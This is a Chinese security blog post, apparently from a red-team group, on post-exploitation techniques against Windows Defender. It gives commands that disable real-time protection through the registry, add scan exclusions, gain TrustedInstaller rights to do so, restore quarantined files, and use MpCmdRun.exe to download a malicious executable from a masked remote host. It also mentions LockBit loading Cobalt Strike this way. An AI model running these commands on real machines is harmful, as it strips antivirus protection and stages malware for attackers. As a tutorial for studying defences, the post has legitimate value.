---
title: Windows Defender的一些渗透知识
url: https://www.anquanke.com/post/id/285521
source: 安全客-有思想的安全新媒体
date: 2023-01-19
fetch_date: 2025-10-04T04:15:02.276004
---

# Windows Defender的一些渗透知识

首页

阅读

* [安全资讯](https://www.anquanke.com/news)
* [安全知识](https://www.anquanke.com/knowledge)
* [安全工具](https://www.anquanke.com/tool)

活动

社区

学院

安全导航

内容精选

* [专栏](/column/index.html)
* [精选专题](https://www.anquanke.com/subject-list)
* [安全KER季刊](https://www.anquanke.com/discovery)
* [360网络安全周报](https://www.anquanke.com/week-list)

# Windows Defender的一些渗透知识

阅读量**447447**

发布时间 : 2023-01-18 10:30:41

**x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![]()

## 前言

Microsoft Defender，最初称为Microsoft AntiSpyware，是微软推出的一款杀毒软件。
相信大家对Windows Defender 的防御性能还是没有怀疑的，毕竟最了解Windows系统的还得是微软自己。但是这货也比较令人头疼，毕竟它检测到问题直接就杀了，然后弹窗告诉用户“我已经拦截了一个XXX”。完全属于先斩后奏。今天正好看到大佬的文章，跟着学习一下Windows defender相关的知识。

## 测试环境版本

系统：Windows server 2016
Windows defender版本：
版本信息：
反恶意软件容户端版本：4.10.14393.1794
引擎版本：1.1.19500.2
防病毒定义：1.373.1325.0
反间谍软件定义：1.373.1325.0
网络检查系统引擎版本：2.1.14600 4
网络检查系统定义版本：119.0.00
测试权限：administrator

![]()

## 查看Windows defender版本

### 面板查看

设置-更新和安全-Windows Defender

![]()

### 命令行查看

注：新版本Windows Defender已不适用

```
dir "C:\ProgramData\Microsoft\Windows Defender\Platform\" /od /ad /b
```

![]()

## 查看已存在的查杀排除列表

* 通过面板查看依次选择

  ```
  设置-更新和安全-Windows Defender-添加排除项
  ```

  如下图

![]()

* 通过命令行查看

  ```
  reg query "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions" /s
  ```

![]()

* 通过Powershell查看

  ```
  Get-MpPreference | select ExclusionPath
  ```

![]()

## 关闭Windows Defender的实时保护

1.通过面板关闭依次选择

```
设置-更新和安全-Windows Defender-实时保护
```

![]()

### 通过命令行关闭defender 实时保护

* 需要TrustedInstaller权限
* 需要关闭Tamper Protection

  ```
  reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /d 1 /t REG_DWORD /f
  ```

![]()

注： 通过命令行开启defender 实时保护

```
reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Real-Time Protection" /v "DisableRealtimeMonitoring" /f
```

注：新版本的Windows已经不再适用

## 添加查杀排除列表

### 通过面板添加

依次选择
设置-更新和安全-Windows Defender-排除-添加排除项-选择排除的进程或文件类型&文件夹

* 该操作等价于修改注册表HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\的键值，具体位置如下：
  > 类型文件对应注册表项TemporaryPaths
  > 类型文件夹对应注册表项Paths
  > 类型文件类型对应注册表项Extensions
  > 类型进程对应注册表项Processes

### 通过命令行添加

利用条件:需要TrustedInstaller权限

```
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" /v "c:\tide" /d 0 /t REG_DWORD /f
```

![]()

## 恢复被隔离的文件

参考资料：<https://docs.microsoft.com/en-us/microsoft-365/security/defender-endpoint/command-line-arguments-microsoft-defender-antivirus?view=o365-worldwide>

### MpCmdRun.exe存在的位置

简介
mpcmdrun.exe 是 Microsoft Windows 安全系统的重要组成部分，可帮助保护您的 PC 免受在线威胁和恶意软件的侵害。如果您想自动化 Microsoft 安全防病毒，也可以使用此实用程序。.exe 必须从 Windows 命令提示符运行。
在实验过三个不同的Windows版本后，发现微软在新版本已经更改了MpCmdRun的位置（具体哪个版本后更改的不清楚，在这两个路径下查找就对了）
更改后的位置在

```
C:\Program Files\Windows Defender\MpCmdRun.exe
```

老版本

```
dir "C:\ProgramData\Microsoft\Windows Defender\Platform\" /od /ad /b
```

得到版本号后，则他存在的位置为

```
C:\ProgramData\Microsoft\Windows Defender\Platform\<版本>
```

比如我这台存在的物理位置为

![]()

```
C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2205.7-0\X86
```

### 常用命令

查看被隔离的文件列表

```
MpCmdRun -Restore -ListAll
```

![]()

恢复指定名称的文件至原目录

```
MpCmdRun -Restore -FilePath C:\tide\7.exe
```

恢复所有文件至原目录

```
MpCmdRun -Restore -All
```

![]()

查看指定路径是否位于排除列表中

```
MpCmdRun -CheckExclusion -path C:\test
```

## 补充1：获取TrustedInstaller权限

### AdvancedRun

AdvancedRun是运行于Windows系统的轻量级程序设置优先级软件，可以轻松设置程序运行优选级，并且还能够支持通过命令行调用设置，也支持将参数保存为配置文件，以便于更好进行使用。
在图形化界面

![]()

或者使用命令行

```
AdvancedRun.exe /EXEFilename "%windir%\system32\cmd.exe" /CommandLine '/c reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Real-Time Protection" /v "DisableRealtimeMonitoring" /d 1 /t REG_DWORD /f' /RunAs 8 /Run
```

## 补充2：MpCmdRun.exe利用

### MpCmdRun恶意文件下载

Windows Defender自带的命令执行工具”MpCmdRun.exe”可以用来实现远程下载恶意文件的目的，但是免杀好像还是不太可靠，不过我们可以在cmd中关闭Windows Defender，所以这样一来，一结合就变得有意思多了，不管在使用该思路的过程中还需要权限提升，但是CS因为在后渗透测试中有很好的辅助功能，所以总体来说还是划算的~
PS：经过实验发现在新版本中下载任何文件Windows defender都会报毒并隔离（下图），若尝试关闭实时保护则mpcmdrun不可用。。。不过老版本defender还是可以的。
在目标主机上使用Windows Defender自带的MpCmdRun.exe程序下载恶意文件

```
MpCmdRun.exe -DownloadFile -url http://*.*.*.*:81/co.exe -path c:\co.exe
```

![]()

### MpCmdRun.exe解密和加载Cobalt Strike攻击载荷

这篇文章是7月底发布的，还算比较新（在我10月份写这篇文章的时候）。
<https://www.bleepingcomputer.com/news/security/lockbit-ransomware-abuses-windows-defender-to-load-cobalt-strike/>
一开始还以为是生成含有恶意载荷的dll文件替为MPClient.dll后就可以执行，结果在自己机器上尝试了一下根本不能上线，仔细看了看（谷歌翻译后）才明白大意是攻击者通过MpCmdRun.exe 加载修改后的MPClient.dll执行c0000015.log进而实现上线Cobalt Strike，当然这就触及到我的知识盲区了，感兴趣的铁子可以继续研究一下（教教我）。

![]()

## 参考文章

<https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80-Windows-Defender>

本文翻译自 原文链接。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由**Tide安全团队**原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处： [https://www.anquanke.com/post/id/285521](/post/id/285521)

安全KER - 有思想的安全新媒体

本文转载自:

如若转载,请注明出处：

安全KER - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

* [Windows Defender](/tag/Windows%20Defender)

**+1**0赞

收藏

![](https://p5.ssl.qhimg.com/t013dca47abc465f8d2.png)Tide安全团队

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

## 发表评论

您还未登录，请先登录。

[登录](/login/index.html)

![](https://p2.ssl.qhimg.com/t014757b72460d855bf.png)

[![](https://p5.ssl.qhimg.com/t013dca47abc465f8d2.png)](/member.html?memberId=142933)

[Tide安全团队](/member.html?memberId=142933)

Tide安全团队正式成立于2019年1月，是新潮信息旗下以互联网攻防技术研究为目标的安全团队，目前聚集了十多位专业的安全攻防技术研究人员，专注于网络攻防、Web安全、移动终端、安全开发、IoT/物联网/工控安全等方向。

* 文章
* **83**

* 粉丝
* **71**

### TA的文章

* ##### [windows应急响应](/post/id/287417)

  2023-03-15 15:30:13
* ##### [初识内存取证-volatility与Easy\_dump](/post/id/287019)

  2023-03-08 14:30:12
* ##### [车联网安全入门之从CAN模拟环境搭建到重放攻击](/post/id/287021)

  2023-03-06 15:30:43
* ##### [Pwn入门之ret2libc详解](/post/id/286999)

  2023-03-06 10:30:35
* ##### [Windows Defender的一些渗透知识](/post/id/285521)

  2023-01-18 10:30:41

### 相关文章

* ##### [为AI Agent行为立“规矩”——字节跳动提出Jeddak AgentArmor智能体安全框架](/post/id/312426)

  2025-09-28 13:43:32
* ##### [教你打造一款AI安全助手 | 安全MCP的实践指南](/post/id/311884)

  2025-09-05 10:40:51
* ##### [当数字世界的“万能钥匙”被滥用，谁来守护核心资产？火山的 MCP 安全授权新范式](/post/id/311597)

  2025-08-28 09:50:41
* ##### [Python代码保护之重置操作码映射的攻与防探究（一）](/post/id/311484)

  2025-08-26 10:49:47

### 热门推荐

文章目录

* [前言](#h2-0)
* [测试环境版本](#h2-1)
* [查看Windows defender版本](#h2-2)
  + [面板查看](#h3-3)
  + [命令行查看](#h3-4)
* [查看已存在的查杀排除列表](#h2-5)
* [关闭Windows Defender的实时保护](#h2-6)
  + [通过命令行关闭defender 实时保护](#h3-7)
* [添加查杀排除列表](#h2-8)
  + [通过面板添加](#h3-9)
  + [通过命令行添加](#h3-10)
* [恢复被隔离的文件](#h2-11)
  + [MpCmdRun.exe存在的位置](#h3-12)
  + [常用命令](#h3-13)
* [补充1：获取TrustedInstaller权限](#h2-14)
  + [AdvancedRun](#h3-15)
* [补充2：MpCmdRun.exe利用](#h2-16)
  + [MpCmdRun恶意文件下载](#h3-17)
  + [MpCmdRun.exe解密和加载Cobalt Strike攻击载荷](#h3-18)
* [参考文章](#h2-19)

![](https://p0.qhimg.com/t11098f6bcd5614af4bf21ef9b5.png)

安全KER

* [关于我们](/about)
* [联系我们](/note/contact)
* [用户协议](/note/protocol)
* [隐私协议](/note/privacy)

商务合作

* [合作内容](/note/business)
* [联系方式](/note/contact)
* [友情链接](/link)

内容需知

* [投稿须知](https://www.anquanke.com/contribute/tips)
* [转载须知](/note/repost)
* 官网QQ群：568681302

合作单位

* [![安全KER](https://p0.ssl.qhimg.com/t01592a959354157bc0.png)](http://www.cert.org.cn/)
* [![安全KER](https://p0.ssl.qhimg.com/t014f76fcea94035e47.png)](http://www.cnnvd.org.cn/)

Copyright © 北京奇虎科技有限公司 三六零数字安全科技集团有限公司 安全KER All Rights Reserved [京ICP备08010314号-66](https://beian.miit.gov.cn/)[![](https://icon.cnzz.com/img/pic.gif)](https://www.cnzz.com/stat/website.php?web_id=1271278035 "站长统计")

微信二维码

**X**![安全KER](https://p0.ssl.qhimg.com/t0151209205b47f2270.jpg)